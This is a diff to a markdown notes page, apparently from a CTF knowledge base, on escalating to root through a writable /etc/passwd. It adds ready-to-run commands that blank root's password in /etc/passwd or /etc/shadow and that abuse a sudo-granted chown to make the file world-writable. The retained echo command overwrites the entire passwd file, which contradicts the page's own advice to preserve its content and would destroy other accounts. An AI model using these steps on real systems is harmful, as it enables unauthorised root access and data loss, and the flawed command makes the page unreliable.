@@ -8,7 +8,7 @@ related: [[sudo-abuse]]
 
 # Writable /etc/passwd
 
-When `/etc/passwd` is writable by your group, you can add a password-less root entry and switch user.
+When `/etc/passwd` is writable by you (or you can *make* it writable), you can add or blank a root entry and switch user.
 
 ## Check
 
@@ -17,19 +17,39 @@ ls -l /etc/passwd
 # -rw-rw-r-- 1 root pinguinos ... → group-writable
 ```
 
+It may also already be writable for other reasons — or you can force it with `sudo chown` (see below).
+
 ## Exploit
 
-1. Add a root entry with an empty password field:
+Two equivalent moves: add a fresh root entry, or blank the existing `root` entry.
+
+1. **Add a root entry** with an empty password field:
    ```sh
    echo 'root::0:0:root:/root:/bin/sh' > /etc/passwd
    ```
-2. `su` to that account (no password required).
+2. **Blank existing root's password** (preserves the rest of the line):
+   ```sh
+   sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd.new
+   cat /tmp/passwd.new > /etc/passwd
+   ```
+3. `su -` to root (no password required).
+
+## Making it writable via `sudo chown`
+
+If `sudo -l` grants you `chown` (as root), you can *create* the writable condition:
+
+```sh
+sudo -u root /usr/bin/chown $(id -u):$(id -g) /etc/passwd
+chmod 777 /etc/passwd
+```
+
+Owning the file also lets you `chmod` it. This is the [[anonymous-pingu]] route ([[sudo-abuse]]).
 
 ## Notes
 
-- Modern systems store hashes in `/etc/shadow`, but an empty password field still bypasses auth on many setups.
+- Modern systems store hashes in `/etc/shadow`, but an empty password field still bypasses auth on many setups. The same empty-field trick works in `/etc/shadow` (blank the second field).
 - Preserve the original file content when possible.
 
 ## Seen in
 
-[[adopting]]
+[[adopting]], [[anonymous-pingu]]
